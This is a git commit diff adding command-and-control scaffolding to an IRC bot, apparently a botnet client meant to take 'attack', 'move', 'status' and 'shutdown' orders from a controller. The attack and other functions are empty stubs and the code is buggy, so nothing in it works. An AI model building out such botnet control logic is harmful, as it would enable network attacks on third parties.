3f9c0d6c61db830448be86bbfd7b1c254730277e
Josh <josh.qns@gmail.com>
2017-11-29 17:15:40 -0700

    moreBot

--- bot.py
+++ bot.py
@@ -8,7 +8,7 @@ PORT = None
 CHANNEL = None 
 PHRASE = None 
 IRC = None
-
+CONTROLLER_FLAG = True 
 
 # BOT TODO
 # Listen on channel and detect secret phrase from controller
@@ -16,10 +16,58 @@ IRC = None
 # Commands: Network attack, migration to different IRC, ShutDown
 # Report status of command execution to controller
 
+def getStatus():    
+    return
+
+def attack():
+    pass
+
+def move():
+    pass 
+
+def quit():
+    pass 
+
+def shutdown():
+    pass
+
 
 # GET COMMANDS FROM CONTROLLER
 def getCommand(conSocket):
     msg = conSocket.recv(1024).decode('utf-8', 'ignore').strip()
+    return 
+
+# DO COMMANDS
+def commandHandler():
+
+    # Get Commands
+    # status, attack <host><port>, move<host><port><channel>, quit, shutdown
+    command = getCommand(conSocket)
+    command = command.split()
+
+    if command == "status":
+        print("Command: status")
+        status = getStatus()
+        print(str(status))
+    elif command == "attack":
+        try:
+            host = command[1]
+            port = command[2]
+            print("Command: attack " + str(host) + " " + str(port))
+            attack(host, port)
+        except:
+            pass
+    elif command == "move":
+        try:
+            host = command[1]
+            port = command[2]
+            channel = command[3]
+            move(host, port, channel)
+            print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
+    elif command == "quit":
+        quit()
+    elif command == "shutdown":
+        shutdown()
 
 
 
@@ -30,9 +78,10 @@ def serverConnect(ircSocket, host, port):
     try:
         ircSocket.connect((host,port))
         print("Connection successful")
+        return True
     except:
         print("Connection failed")
-
+        return False 
 
 
 
@@ -57,7 +106,10 @@ if __name == "__main__":
     while True:
         ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Do connection stuff
-
+        connectionFlag = serverConnect(ircSocket, HOST, PORT)
+        while connectionFlag:
+            commandHandler()
+            
         
 
         
